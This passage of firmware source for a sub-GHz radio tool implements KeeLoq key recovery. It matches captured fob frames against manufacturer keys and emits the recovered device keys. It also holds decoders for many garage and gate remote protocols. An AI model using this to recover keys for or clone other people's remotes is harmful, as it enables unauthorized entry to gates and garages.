      /* mode 0: simple/seed — device key = mfr key */                         \
      { uint32_t cc[KR_MAX_FRAMES]; uint8_t bb[KR_MAX_FRAMES]; int32_t md=0;  \
        int s = ks_krScore(_mk, cc, bb, &md);                                  \
        if(s > bestScore){ bestScore=s; bestKey=_mk; bestDevKey=_mk;           \
          bestName=(_name); bestPattern=(_pat); bestMode="simple";             \
          bestLearn=KL_SIMPLE; bestMaxDelta=md;                                \
          memcpy(bestCtrs,cc,sizeof(cc)); memcpy(bestBtn,bb,sizeof(bb)); }     \
      }                                                                        \
      /* every derived mode, in the helper's fixed order */                    \
      for(uint8_t _m=0; _m<N_KL_DERIV_MODES; _m++){                            \
        uint32_t cc[KR_MAX_FRAMES]; uint8_t bb[KR_MAX_FRAMES]; int32_t md=0;  \
        int s = ks_krScore(_dks[_m], cc, bb, &md);                             \
        if(s > bestScore){ bestScore=s; bestKey=_mk; bestDevKey=_dks[_m];      \
          bestName=(_name); bestMode=KL_MODE_NAME[_m];                          \
          bestLearn=KL_MODE_LEARN[_m];                                         \
          bestPattern=(_pat || KL_MODE_LEARN[_m] == KL_HEURISTIC);              \
          bestMaxDelta=md;                                                      \
          memcpy(bestCtrs,cc,sizeof(cc)); memcpy(bestBtn,bb,sizeof(bb)); }     \
      }                                                                        \
    } while(0)

  // Built-in real manufacturer keys. A match is only offered as an
  // identification when the entry is a real typed key; suspect entries
  // (unrecorded learning type, factory default) are flagged as such.
  for(int i = 0; i < N_MFR_KEYS; i++) TRY_KEY(MFR_KEYS[i].name, ks_unmaskMfrKey(MFR_KEYS[i].key), (MFR_KEYS[i].suspect!=0));
  // User-loaded keys
  for(int i = 0; i < MAX_USER_KEYS; i++){
    if(USR_KEYS[i].magic != USR_KEY_MAGIC) continue;
    TRY_KEY(USR_KEYS[i].name, USR_KEYS[i].key, false);
  }
  #undef TRY_KEY

  // Minimum passing score = hard-reject tests cleared, zero soft bonuses:
  //   frame 0: +3 base; each extra frame: +3 (wide delta, no cross-check)
  // Soft bonuses (delta < 4 → +2 extra; cross-check match → +2/frame) can
  // push actual scores well above this floor.
  int needScore = 3 + 3 * (KR.got - 1);

  // ── Auto-escalate marginal 2-frame results ───────────────────────────────
  // If we have exactly 2 frames and the best match only barely passed on a
  // wide counter gap (Δ > 16), request a 3rd frame before committing.
  // A Δ > 16 means the fob was out of range between presses, so the counter
  // evidence is weak — a 3rd frame dramatically reduces false-positive risk.
  if(bestScore >= needScore && KR.got == 2 && bestMaxDelta > 16
     && KR.need < KR_MAX_FRAMES){
    KR.need = 3;
    serialEmit(String("{\"event\":\"key_recover_escalating\",\"reason\":\"marginal-delta\","
      "\"max_delta\":") + bestMaxDelta +
      ",\"hint\":\"Collecting one more frame for higher confidence — press the fob again\"}");
    return; // do not finalize yet; wait for ks_krPush to call us again
  }

  // ── Confidence tier ───────────────────────────────────────────────────────
  // high   : 3+ frames, worst-case Δ ≤ 8  (consecutive or near-consecutive)
  // medium : 2+ frames, worst-case Δ ≤ 16 (or high frame count offsets)
  // low    : only 2 frames with a large gap (weak counter evidence)
  const char* confidence =
    (KR.got >= 3 && bestMaxDelta <= 8)  ? "high" :
    (bestMaxDelta <= 16 || KR.got >= 3) ? "medium" : "low";

  String out = "{\"event\":\"key_recover_result\",";
  if(bestScore >= needScore){
    char kh[20];
    snprintf(kh, 20, "%08lX%08lX",
      (unsigned long)(bestKey >> 32),
      (unsigned long)(bestKey & 0xFFFFFFFFUL));
    out += "\"ok\":true,\"key_name\":\"" + bestName + "\"";
    char dkh[20];
    snprintf(dkh, 20, "%08lX%08lX",
      (unsigned long)(bestDevKey >> 32),
      (unsigned long)(bestDevKey & 0xFFFFFFFFUL));
    out += ",\"key_hex\":\"" + String(kh) + "\"";
    out += ",\"device_key_hex\":\"" + String(dkh) + "\"";
    out += ",\"mode\":\"" + bestMode + "\"";
    out += ",\"learn\":\"" + String(ks_klLearnName(bestLearn)) + "\"";
    out += ",\"score\":" + String(bestScore);
    out += ",\"frames\":" + String(KR.got);
    out += ",\"max_delta\":" + String((long)bestMaxDelta);
    out += ",\"confidence\":\"" + String(confidence) + "\"";
    out += ",\"pattern\":" + String(bestPattern ? "true" : "false");
    out += ",\"sn\":" + String((unsigned long)(KR.frames[0].sn & 0x0FFFFFFFUL));
    out += ",\"btn\":" + String((unsigned)bestBtn[0]);
    out += ",\"ctrs\":[";
    for(int i = 0; i < KR.got; i++){
      if(i) out += ",";
      out += String((unsigned long)bestCtrs[i]);
    }
    out += "]";
    // False-positive bound: conservative lower bound of 2^(16*(N-1)) from
    // the SN-top-16 match alone (ignoring counter+button+cross-check filters).
    uint32_t followups = (uint32_t)(KR.got - 1);
    uint64_t bound = (followups >= 4) ? 0xFFFFFFFFFFFFFFFFULL : (1ULL << (16 * followups));
    if(bestPattern){
      out += ",\"note\":\"Unconfirmed: the derivation that matched is a heuristic, or the "
             "key is a factory default with no recorded learning type. The arithmetic fits, "
             "but this is a lead to verify, not an identification.\"";
    } else {
      out += ",\"note\":\"Key identified by SN+button+counter consistency across "
          + String(KR.got) + " frames; false-positive probability < 1 in " + String((unsigned long long)bound) + "\"";
    }
    // save_hint: copy-paste this JSON into serial to store the device key
    // for instant matching in future scans (no key_recover needed next time).
    out += ",\"save_hint\":\"{\\\"cmd\\\":\\\"add_user_key\\\",\\\"n\\\":\\\"<label>\\\",\\\"k\\\":\\\"" + String(dkh) + "\\\"}\"";
  } else {
    out += "\"ok\":false,\"reason\":\"no-match\"";
    out += ",\"frames\":" + String(KR.got);
    out += ",\"best_score\":" + String(bestScore);
    out += ",\"needed\":" + String(needScore);
    out += ",\"confidence\":\"" + String(confidence) + "\"";
    out += ",\"hint\":\"Your fob may use a non-public manufacturer key. Try the seed/learn capture: hold two outer buttons together for ~5 s and re-run capture during the special transmission.\"";
  }
  out += "}";
  krLastResultJson = out;
  serialEmit(out);

  KR.active = false;
  setLed(0, 150, 65);
}

// Called from the KeeLoq decode block on each successful parse.
// When recovery is active, push the frame into the session buffer; on full,
// run the analyzer.
static void ks_krPush(const KLFrame& f){
  if(!KR.active) return;
  // Session age cap: reject frames arriving more than 2 minutes after the
  // session was started. This prevents a stale partial session from being
  // contaminated by a later unrelated capture.
  if(millis() - KR.startedMs > 120000UL){
    serialEmit("{\"event\":\"key_recover_expired\",\"reason\":\"session-timeout-2min\","
               "\"hint\":\"Session expired. Run key_recover again.\"}");
    KR.active = false;
    return;
  }
  // Reject mismatched serial / button: rolling-press recovery requires the
  // same fob+button across all captures.
  if(KR.got > 0){
    if((f.sn & 0x0FFFFFFFUL) != (KR.frames[0].sn & 0x0FFFFFFFUL)){
      serialEmit("{\"event\":\"key_recover_skipped\",\"reason\":\"different-fob\",\"sn\":"
                 + String((unsigned long)f.sn) + "}");
      return;
    }
    if(f.btn != KR.frames[0].btn){
      serialEmit("{\"event\":\"key_recover_skipped\",\"reason\":\"different-button\",\"btn\":"
                 + String((unsigned)f.btn) + "}");
      return;
    }
  }
  // De-dup obvious repeats (CC1101 often catches the same frame twice in a row)
  if(KR.got > 0 && KR.frames[KR.got - 1].hop == f.hop) return;

  if(KR.got < KR_MAX_FRAMES){
    KR.frames[KR.got] = f;
    KR.got++;
    char hh[12]; snprintf(hh, 12, "0x%08lX", (unsigned long)f.hop);
    serialEmit(String("{\"event\":\"key_recover_progress\",\"got\":") + KR.got
               + ",\"need\":" + KR.need + ",\"sn\":" + String((unsigned long)f.sn)
               + ",\"btn\":" + String((unsigned)f.btn)
               + ",\"hop\":\"" + hh + "\"}");
    // LED feedback: ramp from blue → cyan as captures accumulate
    setLed(0, 60 + 60 * KR.got, 200 - 30 * KR.got);
    if(KR.got >= KR.need) ks_krAnalyze();
  }
}

static void ks_krStart(uint8_t need){
  if(need < 2) need = 2;
  if(need > KR_MAX_FRAMES) need = KR_MAX_FRAMES;
  KR.active = true;
  KR.need   = need;
  KR.got    = 0;
  KR.startedMs = millis();
  setLed(0, 80, 200);
  serialEmit(String("{\"event\":\"key_recover_started\",\"need\":") + need
             + ",\"window_s\":60,\"hint\":\"Press the same button "
             + need + " times in a row, ~1 s apart.\"}");
}
static void ks_krCancel(){
  KR.active = false; KR.got = 0;
  setLed(0, 150, 65);
  serialEmit("{\"event\":\"key_recover_cancelled\"}");
}
static void ks_krTick(uint32_t nowMs){
  if(!KR.active) return;
  if(nowMs - KR.startedMs > 60000UL){
    if(KR.got >= 2) ks_krAnalyze();
    else { KR.active = false; serialEmit("{\"event\":\"key_recover_timeout\",\"got\":" + String(KR.got) + "}"); setLed(0,150,65); }
  }
}

// ─── Protocol Decoders ───────────────────────────────────────────────────────

static bool ks_decodeCame12(const char* bits,int n,uint16_t& code){
  // Real CAME-12 transmitters repeat the same 12-bit code 3 times in succession.
  // Require at least 2 consecutive matching frames to suppress false positives
  // from the dense 433 MHz ISM band (temp sensors, alarms, etc.).
  // Entropy guard: a valid CAME-12 code must have 3–9 ones out of 12 bits (25%–75%).
  // Preamble-dominated captures produce highly skewed codes (0x000, 0xFFF, 0x555,
  // 0xAAA, 0xCCC, etc.) that repeat trivially — the entropy gate rejects all of them.
  //
  // v3.4 FIX: explicitly reject 0xAAA (101010101010) and 0x555 (010101010101).
  // A KeeLoq fob preamble consists of alternating TE-wide pulses; ks_mkBits maps
  // these to the alternating "1010…" / "0101…" pattern, producing 0xAAA or 0x555
  // in every 12-bit window within the preamble.  Both values pass the generic
  // entropy check (6 ones) so without this guard they caused every 433 MHz KeeLoq
  // fob to be misclassified as CAME-12 whenever KeeLoq decoding happened to fail.
  if(n<24) return false;
  for(int o=0;o+24<=n;o++){
    uint16_t v1=0,v2=0;
    for(int i=0;i<12;i++) v1=(v1<<1)|(bits[o+i]=='1'?1:0);
    for(int i=0;i<12;i++) v2=(v2<<1)|(bits[o+12+i]=='1'?1:0);
    if(v1!=v2||v1==0||v1>=0xFFF) continue;
    if(v1==0x555||v1==0xAAA) continue;  // reject KeeLoq/OOK preamble artefact
    // Reject all-same-nibble codes (0x333, 0x666, 0x999, 0xCCC, etc.).
    // Nice FLOR / periodic carrier noise maps to 1100/0011 repeating patterns
    // that produce 0xCCC or 0x333 in every 12-bit window and trivially match.
    if(((v1>>8)&0xF)==((v1>>4)&0xF) && ((v1>>4)&0xF)==(v1&0xF)) continue;
    uint8_t ones=0; for(uint16_t m=v1;m;m>>=1) ones+=(m&1);
    if(ones<3||ones>9) continue;  // reject trivially repeating patterns
    code=v1; return true;
  }
  return false;
}

static bool ks_decodeFAAC64(const char* bits,int n,uint64_t& fr){
  if(n<64) return false;
  fr=0; int ones=0;
  for(int i=0;i<64;i++){
    uint8_t b=(bits[i]=='1')?1:0;
    fr=(fr<<1)|b; ones+=b;
  }
  // Entropy gate: genuine FAAC-64 rolling frames have ~40-60% ones (encrypted payload).
  // Preamble-only captures and noise are heavily skewed (<25% or >75%), e.g. the
  // repeating 0xCCCC... pattern from distorted KeeLoq preamble edges has ≈50% ones
  // BUT also fails the fr!=0 if all-zero — the real rejection is the repeating-byte test.
  // Reject all-same-nibble frames (0xCCCCCCCC..., 0xAAAA..., etc.) — not valid FAAC.
  if(ones<16||ones>48) return false;               // <25% or >75% ones → noise/preamble
  uint8_t nb=(uint8_t)(fr&0xFF);                   // lowest byte
  bool uniform=true;
  for(int i=1;i<8;i++) if((uint8_t)((fr>>(i*8))&0xFF)!=nb){uniform=false;break;}
  if(uniform) return false;                         // all 8 bytes identical → artefact
  // SN-specific entropy gate: reject frames where all 4 SN bytes (upper 32 bits) are
  // identical (e.g. 0xAAAAAAAA, 0x55555555). Real FAAC rolling-code SNs are factory-
  // programmed with high entropy; repeating-nibble OOK noise patterns pass the full-
  // frame ones-count but always produce uniform SN bytes.
  uint32_t snW=(uint32_t)(fr>>32);
  uint8_t  snB=(uint8_t)(snW&0xFF);
  if(snB==((snW>>8)&0xFF)&&snB==((snW>>16)&0xFF)&&snB==((snW>>24)&0xFF)) return false;
  // Reject nearly-alternating SN patterns (e.g. 0xAAAD5B55 from OOK noise artefacts).
  // XOR of SN with itself right-shifted by 1 bit gives 1 wherever consecutive bits
  // differ. A truly alternating sequence (0xAAAA...) yields popcount ≈ 31; real
  // factory-programmed SNs are random-looking and score ≈ 8–22.
  if(__builtin_popcount(snW ^ (snW>>1)) > 27) return false;
  return true;
}

static bool ks_decodeSomfy(const char* bits,int n,uint64_t& raw,uint8_t& ctrl,uint16_t& roll,uint32_t& addr){
  if(n<56) return false;
  raw=0; for(int i=0;i<56;i++) raw=(raw<<1)|(bits[i]=='1'?1ULL:0ULL);
  // Extract 7 bytes in transmission order (MSB-first from raw bit stream)
  uint8_t rb[7],db[7];
  for(int i=0;i<7;i++) rb[i]=(uint8_t)((raw>>(48-i*8))&0xFF);
  // Standard Somfy-RTS deobfuscation: each byte XOR'd with preceding raw byte
  db[0]=rb[0];
  for(int i=1;i<7;i++) db[i]=rb[i]^rb[i-1];
  // Nibble XOR checksum — all 14 nibbles of the deobfuscated frame XOR to 0.
  // Encoder places the checksum nibble in db[1] low bits to guarantee this.
  // This rejects virtually all noise; 1/16 false-positive rate at most.
  uint8_t ck=0;
  for(int i=0;i<7;i++) ck^=(db[i]>>4)^(db[i]&0xF);
  if(ck&0xF) return false;
  // Field extraction.  Address is stored LE (bytes 4-6) to match buildSomfyRTS.
  ctrl=(db[1]>>4)&0x0F;              // command nibble (1=My,2=Up,4=Down,8=Prog)
  roll=((uint16_t)db[2]<<8)|db[3];   // rolling counter big-endian
  addr=(uint32_t)db[4]|((uint32_t)db[5]<<8)|((uint32_t)db[6]<<16); // LE addr
  return (addr>0 || ctrl>0);         // reject all-zero degenerate frame
}

static bool ks_decodeNice(const char* bits,int n,uint32_t& sn,uint32_t& roll){
  if(n<52) return false; sn=0; roll=0;
  // Bit-entropy guard: genuine Nice FLOR rolling-code frames have roughly 40–60% ones.
  // Noise and car-fob pulse trains missampled at this bit-length are heavily skewed
  // (often <20% or >80% ones) and would otherwise produce a false Nice-FLOR decode.
  int ones=0; for(int i=0;i<52;i++) if(bits[i]=='1') ones++;
  if(ones<13||ones>39) return false; // reject <25% or >75% ones
  for(int i=0;i<28;i++) sn=(sn<<1)|(bits[i]=='1'?1:0);
  for(int i=28;i<52;i++) roll=(roll<<1)|(bits[i]=='1'?1:0);
  // Require both fields non-zero: noise rarely produces two independent non-zero fields
  return (sn>0 && roll>0);
}

static bool ks_decodeMarantec(const char* bits,int n,uint16_t& addr,uint8_t& cmd){
  // Require at least 2 complete 16-bit frames for the repeat check below.
  if(n<32) return false; addr=0; cmd=0;
  for(int i=0;i<12;i++) addr=(addr<<1)|(bits[i]=='1'?1:0);
  for(int i=12;i<16;i++) cmd=(cmd<<1)|(bits[i]=='1'?1:0);
  if(addr==0||addr==0xFFF) return false;
  // Entropy gate: valid Marantec 12-bit address has 3–9 ones (25%–75%).
  // All-same-nibble codes (e.g. 0xAAA, 0xCCC) have 0, 6, or 12 ones and
  // arise from periodic ISM-band carrier patterns, not real remotes.
  uint8_t ones=0; for(uint16_t m=addr;m;m>>=1) ones+=(m&1);
  if(ones<3||ones>9) return false;
  // Repeat check: Marantec-D transmits the same 16-bit frame consecutively.
  // A matching frame at offset 16 suppresses false positives from periodic
  // interference (Nice FLOR, gate bursts) whose bit pattern repeats at a
  // period OTHER than 16 bits, so windows at [0..15] and [16..31] differ.
  uint16_t a2=0; uint8_t c2=0;
  for(int i=0;i<12;i++) a2=(a2<<1)|(bits[16+i]=='1'?1:0);
  for(int i=12;i<16;i++) c2=(c2<<1)|(bits[16+i]=='1'?1:0);
  return (addr==a2 && cmd==c2);
}

static bool ks_decodePT2262(const char* bits,int n,uint32_t& code){
  if(n<24) return false; code=0;
  for(int i=0;i<24;i++) code=(code<<1)|(bits[i]=='1'?1:0);
  // Reject all-zero / all-ones (noise/idle) already filtered by caller.
  // Also reject alternating patterns (0xAAAAAA / 0x555555) that arise when
  // preamble leaks into this decoder: real DIP-switch PT2262 codes have long
  // same-bit runs giving ≤73% transitions; preamble leakage is ~100%.
  if(code==0||code==0xFFFFFFUL) return false;
  int tr=0; for(int i=0;i<23;i++) if(((code>>i)&1)!=((code>>(i+1))&1)) tr++;
  if(tr>17) return false; // reject alternating-preamble noise
  // Reject all-same-nibble 24-bit codes (0xCCCCCC, 0x999999, 0x666666, etc.).
  // Real PT2262 DIP-switch codes are set by physical switches and never produce
  // six identical nibbles — that pattern arises only from periodic carrier
  // noise (Nice FLOR, gate bursts) that fools the transition-count filter
  // because their 1100-repeating bit pattern scores only 52% transitions.
  { uint8_t nb=code&0xF; bool sns=true;
    for(int i=4;i<24;i+=4) if(((code>>i)&0xF)!=nb){sns=false;break;}
    if(sns) return false; }
  return true;
}

static bool ks_decodeLinear10(const char* bits,int n,uint16_t& code){
  if(n<10) return false; code=0;
  for(int i=0;i<10;i++) code=(code<<1)|(bits[i]=='1'?1:0);
  // Linear/Multi-Code is a FIXED 10-bit DIP code. Reject the all-zero and
  // all-ones (0x3FF) words — these are noise/idle artefacts, not real codes —
  // so a frame that merely happens to start with 10 bits doesn't get a confident
  // (and wrong) Linear-10 label. The te_lin bit-length cap excludes longer
  // rolling-code frames (Toyota/RKE) from ever reaching this decoder.
  return (code!=0 && code!=0x3FFu);
}

static bool ks_decodeEV1527(const char* bits,int n,uint32_t& addr,uint8_t& data){
  if(n<24) return false; addr=0; data=0;
  for(int i=0;i<20;i++) addr=(addr<<1)|(bits[i]=='1'?1:0);
  for(int i=20;i<24;i++) data=(data<<1)|(bits[i]=='1'?1:0);
  if(addr==0&&data==0) return false;
  // Same alternating-noise guard as PT2262: reject >73% transitions in
  // the 20-bit address field (>14 transitions out of 19 steps = alternating).
  int tr=0; for(int i=0;i<19;i++) if(((addr>>i)&1)!=((addr>>(i+1))&1)) tr++;
  return (tr<=14);
}

static bool ks_decodePT2240(const char* bits,int n,uint16_t& addr,uint8_t& data){
  if(n<20) return false; addr=0; data=0;
  for(int i=0;i<16;i++) addr=(addr<<1)|(bits[i]=='1'?1:0);
  for(int i=16;i<20;i++) data=(data<<1)|(bits[i]=='1'?1:0); return true;
}

static bool ks_decodeHT12E(const char* bits,int n,uint8_t& addr,uint8_t& data){
  if(n<12) return false; addr=0; data=0;
  for(int i=0;i<8;i++) addr=(addr<<1)|(bits[i]=='1'?1:0);
  for(int i=8;i<12;i++) data=(data<<1)|(bits[i]=='1'?1:0); return true;
}

static bool ks_decodeCameTwn30(const char* bits,int n,uint32_t& code){
  if(n<30) return false; code=0;
  for(int i=0;i<30;i++) code=(code<<1)|(bits[i]=='1'?1:0);
  // Reject all-zero and all-ones (30-bit max = 0x3FFFFFFF) — both are noise artefacts
  return (code>0 && code!=0x3FFFFFFFU);
}

static bool ks_decodeLD3(const char* bits,int n,uint16_t& addr,uint32_t& roll){
  if(n<38) return false; addr=0; roll=0;
  // Alternating-bit guard: reject Toyota Denso preamble artefacts.
  // Real ATA/ELSEMA LD3 codes have structured addresses; pure alternating sequences
  // (e.g. 010101…) are preamble leakage — count transitions across 37 bit pairs.
  int tr=0; for(int i=0;i<37;i++) if(bits[i]!=bits[i+1]) tr++;
  if(tr>30) return false;   // >81% transitions → preamble noise
  for(int i=0;i<14;i++) addr=(addr<<1)|(bits[i]=='1'?1:0);
  for(int i=14;i<38;i++) roll=(roll<<1)|(bits[i]=='1'?1:0);
  // Both fields must be non-zero: real Delta-3 remotes have a fixed address and
  // a non-zero rolling counter; all-zero in either field indicates noise.
  return (addr>0 && roll>0);
}

// ─── Extended Protocol Decoders ──────────────────────────────────────────────

// Hörmann HSM4/HSM8 — German garage/gate, 32-bit OOK PWM rolling code
// Frame: 4-bit button + 28-bit serial number
static bool ks_decodeHormann(const char* bits,int n,uint8_t& btn,uint32_t& sn){
  if(n<32) return false; btn=0; sn=0;
  for(int i=0;i<4;i++)  btn=(btn<<1)|(bits[i]=='1'?1:0);
  for(int i=4;i<32;i++) sn =(sn <<1)|(bits[i]=='1'?1:0);
  return sn!=0;
}

// Sommer Twist/Base — German gate, 40-bit OOK PWM rolling (28-bit SN + 12-bit roll)
static bool ks_decodeSommer(const char* bits,int n,uint32_t& sn,uint16_t& roll){
  if(n<40) return false; sn=0; roll=0;
  for(int i=0;i<28;i++)  sn  =(sn  <<1)|(bits[i]=='1'?1:0);
  for(int i=28;i<40;i++) roll=(roll<<1)|(bits[i]=='1'?1:0);
  return (sn!=0||roll!=0);
}

// Beninca TO.GO — Italian gate/garage, 26-bit OOK PWM rolling (12 addr + 2 btn + 12 cnt)
static bool ks_decodeBeninca(const char* bits,int n,uint16_t& addr,uint8_t& btn,uint16_t& cnt){
  if(n<26) return false; addr=0; btn=0; cnt=0;
  for(int i=0;i<12;i++)  addr=(addr<<1)|(bits[i]=='1'?1:0);
  for(int i=12;i<14;i++) btn =(btn <<1)|(bits[i]=='1'?1:0);
  for(int i=14;i<26;i++) cnt =(cnt <<1)|(bits[i]=='1'?1:0);
  return true;
}

// Cardin S449/S466 — Italian gate, 24-bit OOK PWM rolling (12 addr + 12 roll)
static bool ks_decodeCardin(const char* bits,int n,uint16_t& addr,uint16_t& roll){
  if(n<24) return false; addr=0; roll=0;
  for(int i=0;i<12;i++)  addr=(addr<<1)|(bits[i]=='1'?1:0);
  for(int i=12;i<24;i++) roll=(roll<<1)|(bits[i]=='1'?1:0);
  return true;
}

// v2 Phox — European gate/garage, 64-bit OOK rolling (32-bit SN + 32-bit roll)
static bool ks_decodeV2Phox(const char* bits,int n,uint32_t& sn,uint32_t& roll){
  if(n<64) return false; sn=0; roll=0;
  for(int i=0;i<32;i++)  sn  =(sn  <<1)|(bits[i]=='1'?1:0);
  for(int i=32;i<64;i++) roll=(roll<<1)|(bits[i]=='1'?1:0);
  return (sn!=0||roll!=0);
}

// Chamberlain Security+ 1.0 / LiftMaster — US garage, 40-bit OOK (10 fixed + 30 roll)
static bool ks_decodeSecPlus(const char* bits,int n,uint16_t& fixed,uint32_t& roll){
  if(n<40) return false; fixed=0; roll=0;
  for(int i=0;i<10;i++)  fixed=(fixed<<1)|(bits[i]=='1'?1:0);
  for(int i=10;i<40;i++) roll =(roll <<1)|(bits[i]=='1'?1:0);
  return true;
}

// DEA — Italian industrial gates, 40-bit OOK rolling (16-bit SN + 24-bit roll)
static bool ks_decodeDEA(const char* bits,int n,uint16_t& sn,uint32_t& roll){
  if(n<40) return false; sn=0; roll=0;
  for(int i=0;i<16;i++)  sn  =(sn  <<1)|(bits[i]=='1'?1:0);
  for(int i=16;i<40;i++) roll=(roll<<1)|(bits[i]=='1'?1:0);
  return (sn!=0||roll!=0);
}

// AN-Motors AT4 / Doorhan — CIS gate market, 24-bit OOK (16 addr + 4 btn + 4 roll)
static bool ks_decodeAnMotors(const char* bits,int n,uint16_t& addr,uint8_t& btn,uint8_t& roll){
  if(n<24) return false; addr=0; btn=0; roll=0;
  for(int i=0;i<16;i++)  addr=(addr<<1)|(bits[i]=='1'?1:0);
  for(int i=16;i<20;i++) btn =(btn <<1)|(bits[i]=='1'?1:0);
  for(int i=20;i<24;i++) roll=(roll<<1)|(bits[i]=='1'?1:0);
  return true;
}

// ─── Gate and garage protocols (v3.13) ──────────────────────────

// CAME-24 — 24-bit fixed code, same TE as CAME-12 (320/640µs).
static bool ks_decodeCame24(const char* bits,int n,uint32_t& code){
  if(n<48) return false;
  for(int o=0;o+48<=n;o++){
    uint32_t v1=0,v2=0;
    for(int i=0;i<24;i++) v1=(v1<<1)|(bits[o+i]=='1'?1:0);
    for(int i=0;i<24;i++) v2=(v2<<1)|(bits[o+24+i]=='1'?1:0);
    if(v1!=v2||v1==0||v1>=0xFFFFFFUL) continue;
    if((v1>>12)==(v1&0xFFFU)) continue; // reject CAME-12 doubled pattern
    uint8_t ones=0; for(uint32_t m=v1;m;m>>=1) ones+=(m&1);
    if(ones<6||ones>18) continue; // 25-75% entropy
    code=v1; return true;
  }
  return false;
}

// Nice FLO — fixed-code 12-bit or 24-bit, TE=700/1400µs.
// Header: 36×TE LOW gap. Distinct from Nice FloR-S (rolling code, TE≈500µs).
static bool ks_decodeNiceFlo(const char* bits,int n,uint32_t& code,uint8_t& nbits){
  for(int w=24;w>=12;w-=12){
    if(n<2*w) continue;
    for(int o=0;o+2*w<=n;o++){
      uint32_t v1=0,v2=0;
      for(int i=0;i<w;i++) v1=(v1<<1)|(bits[o+i]=='1'?1:0);
      for(int i=0;i<w;i++) v2=(v2<<1)|(bits[o+w+i]=='1'?1:0);
      if(v1!=v2||v1==0) continue;
      uint8_t ones=0; for(uint32_t m=v1;m;m>>=1) ones+=(m&1);
      uint8_t lo=(uint8_t)(w/4),hi=(uint8_t)((w*3)/4);
      if(ones<lo||ones>hi) continue;
      if(w==24&&(v1>>12)==(v1&0xFFFU)) continue; // reject doubled 12-bit artefact
      code=v1; nbits=(uint8_t)w; return true;
    }
  }
  return false;
}

// FAAC SLH — 64-bit rolling, TE=255/595µs (ratio≈2.33:1).
// Frame: [32-bit fix]|[32-bit hop], fix=(serial<<4)|btn. Structural decode — OEM key needed.
static bool ks_decodeFAACSlh(const char* bits,int n,uint32_t& sn,uint8_t& btn,uint32_t& hop){
  if(n<64) return false;
  uint64_t fr=0;
  for(int i=0;i<64;i++) fr=(fr<<1)|(bits[i]=='1'?1:0);
  uint32_t fix=(uint32_t)(fr>>32);
  hop=(uint32_t)(fr&0xFFFFFFFFUL);
  if(fix==0||hop==0) return false;
  btn=fix&0xF;
  if(btn!=0x1&&btn!=0x2&&btn!=0x4&&btn!=0x8&&btn!=0xF) return false; // valid button codes only
  sn=fix>>4;
  if(sn==0) return false;
  uint8_t lb=(uint8_t)(hop&0xFF); bool unif=true;
  for(int i=1;i<4;i++) if((uint8_t)((hop>>(i*8))&0xFF)!=lb){unif=false;break;}
  if(unif) return false; // uniform bytes = noise artefact
  return true;
}

// V2 Phoenix — 52-bit OOK PWM rolling, TE=427/853µs.
// Frame bit-reversed within 56-bit space → serial(32)|btn(8)|enc_ctr(16). Structural.
static uint64_t ks_phx2rev56(uint64_t v){
  uint64_t r=0;
  for(int i=0;i<56;i++) r|=((v>>i)&1ULL)<<(55-i);
  return r;
}
static bool ks_decodePhoenixV2(const char* bits,int n,uint32_t& sn,uint8_t& btn,uint16_t& enc_ctr){
  if(n<52) return false;
  uint64_t raw=0;
  for(int i=0;i<52;i++) raw=(raw<<1)|(bits[i]=='1'?1:0);
  uint64_t rev=ks_phx2rev56(raw)&0xFFFFFFFFFFFFFFULL;
  sn=(uint32_t)(rev&0xFFFFFFFFULL);
  btn=(uint8_t)((rev>>32)&0xFFULL);
  enc_ctr=(uint16_t)((rev>>40)&0xFFFFULL);
  if(sn==0||btn==0||btn>0x0F) return false;
  return true;
}

// CAME Atomo — 62-bit Manchester rolling, TE=600/1200µs.
// Full frame cipher unpublished; emit raw 62-bit value for protocol identification.
static bool ks_decodeCameAtomo(const char* mb,int mn,uint64_t& raw){
  if(mn<62) return false;
  raw=0;
  for(int i=0;i<62;i++) raw=(raw<<1)|(mb[i]=='1'?1:0);
  if(raw==0) return false;
  return true;
}

// ─── Security+ 2.0 (Chamberlain/LiftMaster) — two interleaved 62-bit Manchester packets ─────
// Security+ 2.0 decoding uses mix inversion, a fixed mix order, and base-3 symbols.
static bool sp2_mix_inv(uint8_t iv,uint16_t* p){
  switch(iv){
    case 0x00:p[0]=~p[0]&0x3FF;p[1]=~p[1]&0x3FF;break;
    case 0x01:p[1]=~p[1]&0x3FF;break;
    case 0x02:p[2]=~p[2]&0x3FF;break;
    case 0x04:p[0]=~p[0]&0x3FF;p[1]=~p[1]&0x3FF;p[2]=~p[2]&0x3FF;break;
    case 0x05:case 0x0a:p[0]=~p[0]&0x3FF;p[2]=~p[2]&0x3FF;break;
    case 0x06:p[1]=~p[1]&0x3FF;p[2]=~p[2]&0x3FF;break;
    case 0x08:p[0]=~p[0]&0x3FF;break;
    case 0x09:break;
    default:return false;
  }
  return true;
}
static bool sp2_mix_ord(uint8_t od,uint16_t* p){
  uint16_t a=p[0],b=p[1],c=p[2];
  switch(od){
    case 0x06:case 0x09:p[0]=c;p[2]=a;break;
    case 0x08:case 0x04:p[0]=c;p[1]=a;p[2]=b;break;
    case 0x01:p[0]=b;p[1]=c;p[2]=a;break;
    case 0x00:p[1]=c;p[2]=b;break;
    case 0x05:p[0]=b;p[1]=a;break;
    case 0x02:case 0x0a:break;
    default:return false;
  }
  return true;
}
static bool sp2_half(uint64_t v,uint8_t* r,uint32_t* fx){
  uint8_t ord=(uint8_t)((v>>34)&0xF);
  uint8_t inv=(uint8_t)((v>>30)&0xF);
  uint16_t p[3]={0,0,0};
  for(int i=29;i>=2;i-=3){
    p[0]=(uint16_t)((p[0]<<1)|((v>>i)&1));
    p[1]=(uint16_t)((p[1]<<1)|((v>>(i-1))&1));
    p[2]=(uint16_t)((p[2]<<1)|((v>>(i-2))&1));
  }
  if(!sp2_mix_inv(inv,p)) return false;
  if(!sp2_mix_ord(ord,p)) return false;
  uint8_t d8=(uint8_t)((ord<<4)|inv);
  int k=0;
  for(int i=6;i>=0;i-=2){r[k]=(d8>>i)&3;if(r[k++]==3)return false;}
  for(int i=8;i>=0;i-=2){r[k]=(p[2]>>i)&3;if(r[k++]==3)return false;}
  *fx=((uint32_t)p[0]<<10)|p[1];
  return true;
}
static bool ks_decodeSecPlusV2(const char* mb,int mn,uint32_t& serial,uint8_t& btn,uint32_t& cnt){
  if(mn<124) return false;
  uint64_t pk1=0,pk2=0; bool f1=false,f2=false;
  for(int o=0;o+62<=mn&&(!f1||!f2);o++){
    uint64_t v=0;
    for(int i=0;i<62;i++) v=(v<<1)|(mb[o+i]=='1'?1:0);
    uint8_t r[9]; uint32_t fx;
    if(!sp2_half(v,r,&fx)) continue;
    uint8_t pt=(uint8_t)((v>>40)&0x3);
